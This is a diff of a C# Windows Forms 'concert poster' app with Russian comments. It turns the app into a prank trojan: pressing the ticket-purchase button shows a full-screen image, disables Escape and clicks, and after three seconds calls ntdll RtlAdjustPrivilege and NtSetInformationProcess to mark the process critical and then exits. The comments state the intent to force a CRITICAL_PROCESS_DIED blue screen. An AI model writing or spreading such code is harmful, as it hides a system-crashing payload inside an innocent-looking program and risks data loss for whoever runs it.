@@ -1,21 +1,30 @@
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 class PosterForm : Form
 {
     Image posterImg;
     Image daddyImg;
-    bool isDaddyMode = false; // Tracks whether full-screen image is active
+    bool isDaddyMode = false;
+    System.Windows.Forms.Timer bsodTimer; // Таймер для задержки перед BSoD
+
+    // Импорт функций ntdll.dll для перевода процесса в критический статус
+    [DllImport("ntdll.dll")]
+    private static extern uint RtlAdjustPrivilege(int privilege, bool bEnablePrivilege, bool bCurrentThread, out bool prevValue);
+
+    [DllImport("ntdll.dll")]
+    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
 
     public PosterForm()
     {
-        // Load the poster image
+        // Загрузка ресурсов
         using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("poster.jpg"))
             posterImg = Image.FromStream(s);
 
-        // Load the daddy image
         using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("daddy.png"))
             daddyImg = Image.FromStream(s);
 
@@ -27,7 +36,11 @@ class PosterForm : Form
         DoubleBuffered = true;
         Cursor = Cursors.Hand;
 
-        // Initial setup for the poster mode
+        // Инициализация таймера
+        bsodTimer = new System.Windows.Forms.Timer();
+        bsodTimer.Interval = 3000; // Задержка в миллисекундах (3 секунды)
+        bsodTimer.Tick += BsodTimer_Tick;
+
         SetupPosterLayout();
     }
 
@@ -44,7 +57,6 @@ class PosterForm : Form
     private void SetupFullScreenDaddyLayout()
     {
         isDaddyMode = true;
-        // Cover the literal entire screen bounds (ignoring taskbar)
         Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
         Location = new Point(screenBounds.Left, screenBounds.Top);
         ClientSize = new Size(screenBounds.Width, screenBounds.Height);
@@ -56,64 +68,79 @@ class PosterForm : Form
 
         if (isDaddyMode)
         {
-            // Draw full-screen image stretching to fill the display
             e.Graphics.DrawImage(daddyImg, 0, 0, ClientSize.Width, ClientSize.Height);
         }
         else
         {
-            // Draw original poster
             e.Graphics.DrawImage(posterImg, 0, 0, ClientSize.Width, ClientSize.Height);
         }
     }
 
     protected override void OnMouseClick(MouseEventArgs e)
     {
-        if (isDaddyMode)
-        {
-            // Optional: Click anywhere on full screen to go back or close
-            SetupPosterLayout();
-            Invalidate();
-            return;
-        }
+        if (isDaddyMode) return; // Игнорируем клики, если таймер смерти уже запущен
 
         double fx = (double)e.X / ClientSize.Width;
         double fy = (double)e.Y / ClientSize.Height;
 
-        // little X in the top-right corner of the poster
+        // Кнопка закрытия (крестик)
         if (fx > 0.93 && fy < 0.07)
         {
             Close();
             return;
         }
 
-        // КУПИТЬ БИЛЕТЫ button
+        // Кнопка КУПИТЬ БИЛЕТЫ
         if (fx > 0.17 && fx < 0.83 && fy > 0.92 && fy < 0.995)
         {
             MessageBox.Show("Билеты закончились! Все раскупил Медведь 🐻 , Деревня Петухи", 
                             "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-            // Go full screen with daddy.png
+            // 1. Переключаемся на полный экран с daddy.png
             SetupFullScreenDaddyLayout();
-            Invalidate(); // Forces the form to redraw itself
+            Invalidate(); // Принудительно перерисовываем интерфейс, чтобы картинка появилась
+
+            // 2. Запускаем таймер обратного отсчета до синего экрана
+            bsodTimer.Start();
         }
 
         base.OnMouseClick(e);
     }
 
+    private void BsodTimer_Tick(object sender, EventArgs e)
+    {
+        bsodTimer.Stop(); // Останавливаем таймер во избежание повторного вызова
+        TriggerBsod();
+    }
+
+    private void TriggerBsod()
+    {
+        try
+        {
+            // Получаем SeDebugPrivilege (идентификатор: 20)
+            RtlAdjustPrivilege(20, true, false, out _);
+
+            // Устанавливаем статус BreakOnTermination (класс: 29)
+            int isCritical = 1;
+            IntPtr currentProcessHandle = Process.GetCurrentProcess().Handle;
+            NtSetInformationProcess(currentProcessHandle, 29, ref isCritical, sizeof(int));
+
+            // Завершаем процесс. Так как он критический — Windows немедленно падает в BSoD CRITICAL_PROCESS_DIED
+            Environment.Exit(0);
+        }
+        catch
+        {
+            // Если что-то пошло не так (например, запуск не от Администратора), просто закрываем приложение
+            Environment.Exit(1);
+        }
+    }
+
     protected override void OnKeyDown(KeyEventArgs e)
     {
-        if (e.KeyCode == Keys.Escape)
+        // Блокируем выход по Escape, если приложение перешло в режим Daddy (система уже приговорена)
+        if (e.KeyCode == Keys.Escape && !isDaddyMode)
         {
-            if (isDaddyMode)
-            {
-                // Escape exits full screen back to poster mode
-                SetupPosterLayout();
-                Invalidate();
-            }
-            else
-            {
-                Close();
-            }
+            Close();
         }
         base.OnKeyDown(e);
     }
